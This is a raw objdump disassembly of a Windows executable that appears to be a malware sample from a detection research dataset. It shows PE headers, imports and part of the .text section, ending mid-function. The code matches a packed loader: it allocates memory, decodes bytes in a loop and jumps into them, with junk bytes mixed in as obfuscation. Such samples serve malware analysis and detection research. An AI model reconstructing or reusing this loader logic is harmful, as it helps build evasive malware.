
/home/kali/Desktop/TTDN/100malware_AE_ver2/3ddce67cdc8e78054786009bfd39345cb7af4aae3bd78e948e8987be82d38e2c.exe:     file format pei-i386
/home/kali/Desktop/TTDN/100malware_AE_ver2/3ddce67cdc8e78054786009bfd39345cb7af4aae3bd78e948e8987be82d38e2c.exe
architecture: i386, flags 0x0000010a:
EXEC_P, HAS_DEBUG, D_PAGED
start address 0x00411b6a

Characteristics 0x10f
	relocations stripped
	executable
	line numbers stripped
	symbols stripped
	32 bit words

Time/Date		Wed Apr 25 15:31:32 2012
Magic			010b	(PE32)
MajorLinkerVersion	7
MinorLinkerVersion	0
SizeOfCode		00007000
SizeOfInitializedData	0006a000
SizeOfUninitializedData	0003d000
AddressOfEntryPoint	00001b6a
BaseOfCode		00001000
BaseOfData		00008000
ImageBase		00410000
SectionAlignment	00001000
FileAlignment		00001000
MajorOSystemVersion	4
MinorOSystemVersion	0
MajorImageVersion	0
MinorImageVersion	0
MajorSubsystemVersion	4
MinorSubsystemVersion	0
Win32Version		00000000
SizeOfImage		000f3000
SizeOfHeaders		00001000
CheckSum		00080cc6
Subsystem		00000002	(Windows GUI)
DllCharacteristics	00000000
SizeOfStackReserve	00100000
SizeOfStackCommit	00001000
SizeOfHeapReserve	00100000
SizeOfHeapCommit	00001000
LoaderFlags		00000000
NumberOfRvaAndSizes	00000010

The Data Directory
Entry 0 00000000 00000000 Export Directory [.edata (or where ever we found it)]
Entry 1 00008fe4 00000078 Import Directory [parts of .idata]
Entry 2 000c8000 0002a1b0 Resource Directory [.rsrc]
Entry 3 00000000 00000000 Exception Directory [.pdata]
Entry 4 00000000 00000000 Security Directory
Entry 5 00000000 00000000 Base Relocation Directory [.reloc]
Entry 6 00000000 00000000 Debug Directory
Entry 7 00000000 00000000 Description Directory
Entry 8 00000000 00000000 Special Directory
Entry 9 00000000 00000000 Thread Storage Directory [.tls]
Entry a 00000000 00000000 Load Configuration Directory
Entry b 00000000 00000000 Bound Import Directory
Entry c 00008000 00000170 Import Address Table Directory
Entry d 00000000 00000000 Delay Import Directory
Entry e 00000000 00000000 CLR Runtime Header
Entry f 00000000 00000000 Reserved

There is an import table in .rdata at 0x418fe4

The Import Tables (interpreted .rdata section contents)
 vma:            Hint    Time      Forward  DLL       First
                 Table   Stamp     Chain    Name      Thunk
 00008fe4	0000905c 00000000 00000000 000092f4 00008000

	DLL Name: KERNEL32.dll
	vma:  Hint/Ord Member-Name Bound-To
	91cc	  670  ReleaseSemaphore
	91e0	  818  TerminateThread
	91f2	  393  GetProcAddress
	9204	  869  WaitForSingleObject
	921a	  359  GetModuleHandleA
	922e	  853  VirtualAlloc
	923e	  482  GlobalLock
	924c	  809  Sleep
	9254	  118  DeleteCriticalSection
	926c	  122  DeleteTimerQueue
	9280	  446  GetTickCount
	9290	  346  GetLastError
	92a0	  860  VirtualProtectEx
	92b4	  669  ReleaseMutex
	92c4	  171  ExitProcess
	92d2	  395  GetProcessHeap
	92e4	   70  CreateEventA
	9804	  861  VirtualQuery
	97f4	  424  GetSystemInfo
	97e2	  859  VirtualProtect
	97d6	  689  RtlUnwind
	97c4	  349  GetLocaleInfoA
	97b2	  418  GetStringTypeW
	97a0	  415  GetStringTypeA
	9794	  507  HeapSize
	977a	  428  GetSystemTimeAsFileTime
	9764	  304  GetCurrentProcessId
	974a	  638  QueryPerformanceCounter
	973a	  545  LCMapStringW
	9724	  593  MultiByteToWideChar
	9714	  544  LCMapStringA
	94a8	  412  GetStartupInfoA
	94ba	  253  GetCommandLineA
	94cc	  456  GetVersionExA
	94dc	  501  HeapFree
	94e8	  495  HeapAlloc
	94f4	  817  TerminateProcess
	9508	  303  GetCurrentProcess
	951c	  886  WriteFile
	9528	  414  GetStdHandle
	9538	  357  GetModuleFileNameA
	954e	  834  UnhandledExceptionFilter
	956a	  227  FreeEnvironmentStringsA
	9584	  319  GetEnvironmentStrings
	959c	  228  FreeEnvironmentStringsW
	95b6	  873  WideCharToMultiByte
	95cc	  321  GetEnvironmentStringsW
	95e6	  762  SetHandleCount
	95f8	  336  GetFileType
	9606	  823  TlsFree
	9610	  766  SetLastError
	9620	  306  GetCurrentThreadId
	9636	  825  TlsSetValue
	9644	  824  TlsGetValue
	9652	  822  TlsAlloc
	965e	  499  HeapDestroy
	966c	  497  HeapCreate
	967a	  856  VirtualFree
	9688	  557  LeaveCriticalSection
	96a0	  139  EnterCriticalSection
	96b8	  505  HeapReAlloc
	96c6	  558  LoadLibraryA
	96d6	  235  GetACP
	96e0	  380  GetOEMCP
	96ec	  241  GetCPInfo
	96f8	  514  InitializeCriticalSection

 00008ff8	00009178 00000000 00000000 0000937c 0000811c

	DLL Name: USER32.dll
	vma:  Hint/Ord Member-Name Bound-To
	932e	  435  LoadAcceleratorsA
	9342	  571  SendMessageA
	930e	  203  EnumChildWindows
	935a	  511  PostMessageA
	936a	  430  IsWindowUnicode
	9352	  268  GetDC
	9322	  443  LoadIconA
	9302	  188  DrawTextA

 0000900c	00009170 00000000 00000000 0000939c 00008114

	DLL Name: SHELL32.dll
	vma:  Hint/Ord Member-Name Bound-To
	9388	   94  SHGetFolderPathA

 00009020	0000919c 00000000 00000000 00009480 00008140

	DLL Name: gdiplus.dll
	vma:  Hint/Ord Member-Name Bound-To
	93be	  129  GdipDeleteBrush
	93d0	   45  GdipCloneBrush
	93e2	   33  GdipAlloc
	93ee	  224  GdipFree
	93fa	   82  GdipCreateFromHDC
	940e	  134  GdipDeleteGraphics
	9424	   78  GdipCreateFontFamilyFromName
	9444	  133  GdipDeleteFontFamily
	945c	   77  GdipCreateFont
	946e	  132  GdipDeleteFont
	93a8	  121  GdipCreateSolidFill

 00009034	00009168 00000000 00000000 0000949c 0000810c

	DLL Name: MSACM32.dll
	vma:  Hint/Ord Member-Name Bound-To
	948c	   42  acmStreamSize

 00009048	00000000 00000000 00000000 00000000 00000000

The .rsrc Resource Directory section:
000  Type Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 3
010   Entry: ID: 0x000002, Value: 0x80000028
028    Name Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 2
038     Entry: ID: 0x0000f3, Value: 0x80000078
078      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
088       Entry: ID: 0x000409, Value: 0x0000d8
0d8        Leaf: Addr: 0x0c8118, Size: 0x001854, Codepage: 0
040     Entry: ID: 0x000136, Value: 0x80000090
090      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
0a0       Entry: ID: 0x000409, Value: 0x0000e8
0e8        Leaf: Addr: 0x0c996c, Size: 0x024608, Codepage: 0
018   Entry: ID: 0x000003, Value: 0x80000048
048    Name Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
058     Entry: ID: 0x000001, Value: 0x800000a8
0a8      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
0b8       Entry: ID: 0x000409, Value: 0x0000f8
0f8        Leaf: Addr: 0x0edf74, Size: 0x004228, Codepage: 0
020   Entry: ID: 0x00000e, Value: 0x80000060
060    Name Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
070     Entry: ID: 0x000001, Value: 0x800000c0
0c0      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
0d0       Entry: ID: 0x000409, Value: 0x000108
108        Leaf: Addr: 0x0f219c, Size: 0x000014, Codepage: 0
 Resources start at offset: 0x118

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .text         00006af4  00411000  00411000  00002000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  1 .rdata        00001814  00418000  00418000  0000a000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .data         0003d000  0041a000  0041a000  0000d000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  3 .rsrc         0002a1b0  004d8000  004d8000  0004b000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
SYMBOL TABLE:
no symbols



Disassembly of section .text:

00411000 <.text>:
  411000:	55                   	push   %ebp
  411001:	8b ec                	mov    %esp,%ebp
  411003:	83 ec 5c             	sub    $0x5c,%esp
  411006:	56                   	push   %esi
  411007:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  41100e:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  411015:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  41101c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  411023:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  41102a:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  411031:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  411038:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  41103f:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  411046:	c7 45 b8 00 00 00 00 	movl   $0x0,-0x48(%ebp)
  41104d:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%ebp)
  411054:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%ebp)
  41105b:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%ebp)
  411062:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  411069:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  411070:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  411077:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  41107e:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  411085:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  41108c:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  411093:	ff 15 28 80 41 00    	call   *0x418028
  411099:	89 45 e8             	mov    %eax,-0x18(%ebp)
  41109c:	c7 45 e0 40 00 00 00 	movl   $0x40,-0x20(%ebp)
  4110a3:	6a 66                	push   $0x66
  4110a5:	6a 00                	push   $0x0
  4110a7:	ff 15 34 81 41 00    	call   *0x418134
  4110ad:	8b 45 ac             	mov    -0x54(%ebp),%eax
  4110b0:	50                   	push   %eax
  4110b1:	ff 15 24 80 41 00    	call   *0x418024
  4110b7:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4110bb:	75 17                	jne    0x4110d4
  4110bd:	6a 00                	push   $0x0
  4110bf:	ff 15 20 80 41 00    	call   *0x418020
  4110c5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4110c8:	83 c1 01             	add    $0x1,%ecx
  4110cb:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4110ce:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  4110d1:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4110d4:	c7 45 e8 16 0e 00 00 	movl   $0xe16,-0x18(%ebp)
  4110db:	c7 45 dc 07 00 00 00 	movl   $0x7,-0x24(%ebp)
  4110e2:	c7 45 c8 01 00 00 00 	movl   $0x1,-0x38(%ebp)
  4110e9:	0f b7 45 dc          	movzwl -0x24(%ebp),%eax
  4110ed:	83 f8 07             	cmp    $0x7,%eax
  4110f0:	75 1f                	jne    0x411111
  4110f2:	6a 14                	push   $0x14
  4110f4:	ff 15 1c 80 41 00    	call   *0x41801c
  4110fa:	c7 45 c4 3a 00 00 00 	movl   $0x3a,-0x3c(%ebp)
  411101:	c7 45 a8 9f 04 01 00 	movl   $0x1049f,-0x58(%ebp)
  411108:	c7 45 f8 1b eb 07 14 	movl   $0x1407eb1b,-0x8(%ebp)
  41110f:	eb 22                	jmp    0x411133
  411111:	ff 23                	jmp    *(%ebx)
  411113:	37                   	aaa
  411114:	31 bd b5 53 70 1c    	xor    %edi,0x1c7053b5(%ebp)
  41111a:	06                   	push   %es
  41111b:	08 f0                	or     %dh,%al
  41111d:	07                   	pop    %es
  41111e:	ad                   	lods   %ds:(%esi),%eax
  41111f:	91                   	xchg   %eax,%ecx
  411120:	11 a6 b7 14 af 6e    	adc    %esp,0x6eaf14b7(%esi)
  411126:	6d                   	insl   (%dx),%es:(%edi)
  411127:	6a 01                	push   $0x1
  411129:	6a 00                	push   $0x0
  41112b:	6a 00                	push   $0x0
  41112d:	ff 15 24 81 41 00    	call   *0x418124
  411133:	6a 00                	push   $0x0
  411135:	ff 15 18 80 41 00    	call   *0x418018
  41113b:	c7 45 dc 00 00 41 00 	movl   $0x410000,-0x24(%ebp)
  411142:	ff 35 14 80 41 00    	push   0x418014
  411148:	83 7d c8 01          	cmpl   $0x1,-0x38(%ebp)
  41114c:	74 08                	je     0x411156
  41114e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  411152:	7e 02                	jle    0x411156
  411154:	50                   	push   %eax
  411155:	52                   	push   %edx
  411156:	ff 35 10 80 41 00    	push   0x418010
  41115c:	5a                   	pop    %edx
  41115d:	89 55 b0             	mov    %edx,-0x50(%ebp)
  411160:	5a                   	pop    %edx
  411161:	ff 75 e0             	push   -0x20(%ebp)
  411164:	68 00 10 00 00       	push   $0x1000
  411169:	8b 45 e8             	mov    -0x18(%ebp),%eax
  41116c:	83 c0 50             	add    $0x50,%eax
  41116f:	90                   	nop
  411170:	83 c0 1e             	add    $0x1e,%eax
  411173:	8b c8                	mov    %eax,%ecx
  411175:	51                   	push   %ecx
  411176:	b9 00 00 00 00       	mov    $0x0,%ecx
  41117b:	51                   	push   %ecx
  41117c:	8b c8                	mov    %eax,%ecx
  41117e:	51                   	push   %ecx
  41117f:	58                   	pop    %eax
  411180:	52                   	push   %edx
  411181:	59                   	pop    %ecx
  411182:	ff d1                	call   *%ecx
  411184:	8a d4                	mov    %ah,%dl
  411186:	89 45 f4             	mov    %eax,-0xc(%ebp)
  411189:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  41118c:	81 e9 03 23 00 00    	sub    $0x2303,%ecx
  411192:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  411195:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  411199:	75 12                	jne    0x4111ad
  41119b:	6a 08                	push   $0x8
  41119d:	6a 00                	push   $0x0
  41119f:	6a 0c                	push   $0xc
  4111a1:	8b 55 b8             	mov    -0x48(%ebp),%edx
  4111a4:	52                   	push   %edx
  4111a5:	6a 00                	push   $0x0
  4111a7:	ff 15 38 81 41 00    	call   *0x418138
  4111ad:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4111b0:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4111b3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4111b6:	03 45 e8             	add    -0x18(%ebp),%eax
  4111b9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4111bc:	89 08                	mov    %ecx,(%eax)
  4111be:	6a 64                	push   $0x64
  4111c0:	6a 00                	push   $0x0
  4111c2:	ff 15 0c 80 41 00    	call   *0x41800c
  4111c8:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4111cb:	03 55 c4             	add    -0x3c(%ebp),%edx
  4111ce:	89 55 bc             	mov    %edx,-0x44(%ebp)
  4111d1:	a1 08 80 41 00       	mov    0x418008,%eax
  4111d6:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4111d9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4111dc:	03 4d e8             	add    -0x18(%ebp),%ecx
  4111df:	8b 55 08             	mov    0x8(%ebp),%edx
  4111e2:	89 51 04             	mov    %edx,0x4(%ecx)
  4111e5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4111e8:	03 45 e8             	add    -0x18(%ebp),%eax
  4111eb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4111ee:	6a 0a                	push   $0xa
  4111f0:	6a 00                	push   $0x0
  4111f2:	ff 15 04 80 41 00    	call   *0x418004
  4111f8:	83 7d a8 00          	cmpl   $0x0,-0x58(%ebp)
  4111fc:	76 1b                	jbe    0x411219
  4111fe:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  411201:	51                   	push   %ecx
  411202:	8b 55 e8             	mov    -0x18(%ebp),%edx
  411205:	52                   	push   %edx
  411206:	8b 45 dc             	mov    -0x24(%ebp),%eax
  411209:	03 45 a8             	add    -0x58(%ebp),%eax
  41120c:	50                   	push   %eax
  41120d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  411210:	51                   	push   %ecx
  411211:	e8 77 01 00 00       	call   0x41138d
  411216:	83 c4 10             	add    $0x10,%esp
  411219:	6a 00                	push   $0x0
  41121b:	6a 01                	push   $0x1
  41121d:	8b 55 b8             	mov    -0x48(%ebp),%edx
  411220:	52                   	push   %edx
  411221:	ff 15 00 80 41 00    	call   *0x418000
  411227:	83 7d bc 00          	cmpl   $0x0,-0x44(%ebp)
  41122b:	74 10                	je     0x41123d
  41122d:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  411230:	51                   	push   %ecx
  411231:	ff 75 b0             	push   -0x50(%ebp)
  411234:	8b 75 bc             	mov    -0x44(%ebp),%esi
  411237:	52                   	push   %edx
  411238:	58                   	pop    %eax
  411239:	56                   	push   %esi
  41123a:	8f 45 e8             	pop    -0x18(%ebp)
  41123d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  411240:	89 45 fc             	mov    %eax,-0x4(%ebp)
  411243:	50                   	push   %eax
  411244:	ff 65 fc             	jmp    *-0x4(%ebp)
  411247:	b8 01 00 00 00       	mov    $0x1,%eax
  41124c:	5e                   	pop    %esi
  41124d:	8b e5                	mov    %ebp,%esp
  41124f:	5d                   	pop    %ebp
  411250:	c3                   	ret
  411251:	55                   	push   %ebp
  411252:	8b ec                	mov    %esp,%ebp
  411254:	5d                   	pop    %ebp
  411255:	c3                   	ret
  411256:	55                   	push   %ebp
  411257:	8b ec                	mov    %esp,%ebp
  411259:	83 ec 08             	sub    $0x8,%esp
  41125c:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  411263:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  41126a:	6a 00                	push   $0x0
  41126c:	6a 00                	push   $0x0
  41126e:	6a 15                	push   $0x15
  411270:	6a 00                	push   $0x0
  411272:	6a ff                	push   $0xffffffff
  411274:	ff 15 30 80 41 00    	call   *0x418030
  41127a:	6a 0a                	push   $0xa
  41127c:	ff 15 1c 80 41 00    	call   *0x41801c
  411282:	ff 15 2c 80 41 00    	call   *0x41802c
  411288:	89 45 fc             	mov    %eax,-0x4(%ebp)
  41128b:	83 7d fc 57          	cmpl   $0x57,-0x4(%ebp)
  41128f:	75 1d                	jne    0x4112ae
  411291:	6a 00                	push   $0x0
  411293:	6a 00                	push   $0x0
  411295:	6a 00                	push   $0x0
  411297:	6a 00                	push   $0x0
  411299:	e8 1a 08 00 00       	call   0x411ab8
  41129e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4112a1:	83 7d fc 0b          	cmpl   $0xb,-0x4(%ebp)
  4112a5:	75 07                	jne    0x4112ae
  4112a7:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4112ae:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4112b1:	8b e5                	mov    %ebp,%esp
  4112b3:	5d                   	pop    %ebp
  4112b4:	c3                   	ret
  4112b5:	55                   	push   %ebp
  4112b6:	8b ec                	mov    %esp,%ebp
  4112b8:	83 ec 40             	sub    $0x40,%esp
  4112bb:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  4112c2:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4112c9:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  4112d0:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  4112d7:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  4112de:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  4112e5:	c7 45 d8 db bc e9 8f 	movl   $0x8fe9bcdb,-0x28(%ebp)
  4112ec:	6a 64                	push   $0x64
  4112ee:	6a 00                	push   $0x0
  4112f0:	ff 15 1c 81 41 00    	call   *0x41811c
  4112f6:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  4112fd:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  411304:	ff 15 28 80 41 00    	call   *0x418028
  41130a:	85 c0                	test   %eax,%eax
  41130c:	75 11                	jne    0x41131f
  41130e:	a1 bd b6 13 70       	mov    0x7013b6bd,%eax
  411313:	1c 02                	sbb    $0x2,%al
  411315:	08 f0                	or     %dh,%al
  411317:	07                   	pop    %es
  411318:	52                   	push   %edx
  411319:	ff 75 fc             	push   -0x4(%ebp)
  41131c:	59                   	pop    %ecx
  41131d:	eb 3a                	jmp    0x411359
  41131f:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  411326:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  41132d:	6a 14                	push   $0x14
  41132f:	ff 15 1c 80 41 00    	call   *0x41801c
  411335:	e8 1c ff ff ff       	call   0x411256
  41133a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  41133d:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  411341:	74 0f                	je     0x411352
  411343:	8b 45 d8             	mov    -0x28(%ebp),%eax
  411346:	89 45 dc             	mov    %eax,-0x24(%ebp)
  411349:	c7 45 fc 62 07 00 00 	movl   $0x762,-0x4(%ebp)
  411350:	eb 07                	jmp    0x411359
  411352:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  411359:	81 7d fc 62 07 00 00 	cmpl   $0x762,-0x4(%ebp)
  411360:	75 0c                	jne    0x41136e
  411362:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  411365:	51                   	push   %ecx
  411366:	e8 95 fc ff ff       	call   0x411000
  41136b:	83 c4 04             	add    $0x4,%esp
  41136e:	8b 55 d0             	mov    -0x30(%ebp),%edx
  411371:	52                   	push   %edx
  411372:	ff 15 34 80 41 00    	call   *0x418034
  411378:	33 c0                	xor    %eax,%eax
  41137a:	8b e5                	mov    %ebp,%esp
  41137c:	5d                   	pop    %ebp
  41137d:	c3                   	ret
  41137e:	55                   	push   %ebp
  41137f:	8b ec                	mov    %esp,%ebp
  411381:	81 ec 38 01 00 00    	sub    $0x138,%esp
  411387:	33 c0                	xor    %eax,%eax
  411389:	8b e5                	mov    %ebp,%esp
  41138b:	5d                   	pop    %ebp
  41138c:	c3                   	ret
  41138d:	55                   	push   %ebp
  41138e:	8b ec                	mov    %esp,%ebp
  411390:	81 ec 84 00 00 00    	sub    $0x84,%esp
  411396:	53                   	push   %ebx
  411397:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  41139e:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4113a5:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4113ac:	c7 45 d8 04 00 00 00 	movl   $0x4,-0x28(%ebp)
  4113b3:	c7 45 dc 02 00 00 00 	movl   $0x2,-0x24(%ebp)
  4113ba:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4113c1:	8b 45 0c             	mov    0xc(%ebp),%eax
  4113c4:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4113c7:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  4113ce:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4113d5:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  4113dc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4113df:	83 e9 01             	sub    $0x1,%ecx
  4113e2:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4113e5:	c6 45 f3 00          	movb   $0x0,-0xd(%ebp)
  4113e9:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4113ed:	0f 84 ad 00 00 00    	je     0x4114a0
  4113f3:	8b 55 08             	mov    0x8(%ebp),%edx
  4113f6:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4113f9:	c7 45 c4 01 00 00 00 	movl   $0x1,-0x3c(%ebp)
  411400:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411403:	83 c0 02             	add    $0x2,%eax
  411406:	89 45 fc             	mov    %eax,-0x4(%ebp)
  411409:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  41140c:	03 4d fc             	add    -0x4(%ebp),%ecx
  41140f:	8a 51 01             	mov    0x1(%ecx),%dl
  411412:	88 55 eb             	mov    %dl,-0x15(%ebp)
  411415:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411418:	83 c0 01             	add    $0x1,%eax
  41141b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  41141e:	8a 4d eb             	mov    -0x15(%ebp),%cl
  411421:	88 4d f3             	mov    %cl,-0xd(%ebp)
  411424:	8b 55 ec             	mov    -0x14(%ebp),%edx
  411427:	03 55 fc             	add    -0x4(%ebp),%edx
  41142a:	8a 45 f3             	mov    -0xd(%ebp),%al
  41142d:	88 02                	mov    %al,(%edx)
  41142f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  411432:	03 4d f8             	add    -0x8(%ebp),%ecx
  411435:	0f b6 11             	movzbl (%ecx),%edx
  411438:	89 55 f4             	mov    %edx,-0xc(%ebp)
  41143b:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  41143e:	ff 75 c4             	push   -0x3c(%ebp)
  411441:	58                   	pop    %eax
  411442:	8b c8                	mov    %eax,%ecx
  411444:	03 d9                	add    %ecx,%ebx
  411446:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  411449:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  41144c:	d1 e1                	shl    %ecx
  41144e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  411451:	33 d2                	xor    %edx,%edx
  411453:	f7 f1                	div    %ecx
  411455:	ba 01 00 00 00       	mov    $0x1,%edx
  41145a:	2b d0                	sub    %eax,%edx
  41145c:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  41145f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  411462:	0f af 45 d4          	imul   -0x2c(%ebp),%eax
  411466:	89 45 f8             	mov    %eax,-0x8(%ebp)
  411469:	8b c2                	mov    %edx,%eax
  41146b:	ba 0a 00 00 00       	mov    $0xa,%edx
  411470:	52                   	push   %edx
  411471:	58                   	pop    %eax
  411472:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  411475:	03 4d fc             	add    -0x4(%ebp),%ecx
  411478:	0f b6 11             	movzbl (%ecx),%edx
  41147b:	03 55 f4             	add    -0xc(%ebp),%edx
  41147e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  411481:	03 45 fc             	add    -0x4(%ebp),%eax
  411484:	88 10                	mov    %dl,(%eax)
  411486:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  411489:	83 e9 02             	sub    $0x2,%ecx
  41148c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  41148f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  411492:	3b 55 10             	cmp    0x10(%ebp),%edx
  411495:	0f 8c 65 ff ff ff    	jl     0x411400
  41149b:	e9 a0 00 00 00       	jmp    0x411540
  4114a0:	6a 00                	push   $0x0
  4114a2:	ff 15 30 81 41 00    	call   *0x418130
  4114a8:	50                   	push   %eax
  4114a9:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4114ac:	e8 5f 04 00 00       	call   0x411910
  4114b1:	68 ff 00 00 00       	push   $0xff
  4114b6:	6a 00                	push   $0x0
  4114b8:	6a 00                	push   $0x0
  4114ba:	68 ff 00 00 00       	push   $0xff
  4114bf:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4114c5:	e8 96 01 00 00       	call   0x411660
  4114ca:	50                   	push   %eax
  4114cb:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  4114ce:	e8 ed 01 00 00       	call   0x4116c0
  4114d3:	6a 00                	push   $0x0
  4114d5:	6a 00                	push   $0x0
  4114d7:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4114da:	e8 b1 04 00 00       	call   0x411990
  4114df:	6a 66                	push   $0x66
  4114e1:	6a 00                	push   $0x0
  4114e3:	ff 15 34 81 41 00    	call   *0x418134
  4114e9:	6a 02                	push   $0x2
  4114eb:	6a 00                	push   $0x0
  4114ed:	68 00 00 c0 41       	push   $0x41c00000
  4114f2:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4114f5:	50                   	push   %eax
  4114f6:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  4114f9:	e8 02 05 00 00       	call   0x411a00
  4114fe:	68 00 00 a0 41       	push   $0x41a00000
  411503:	68 00 00 20 41       	push   $0x41200000
  411508:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  41150b:	e8 20 01 00 00       	call   0x411630
  411510:	6a 03                	push   $0x3
  411512:	6a 00                	push   $0x0
  411514:	6a 18                	push   $0x18
  411516:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  411519:	51                   	push   %ecx
  41151a:	ff 15 20 81 41 00    	call   *0x418120
  411520:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  411523:	e8 38 05 00 00       	call   0x411a60
  411528:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  41152b:	e8 b0 04 00 00       	call   0x4119e0
  411530:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  411533:	e8 b8 03 00 00       	call   0x4118f0
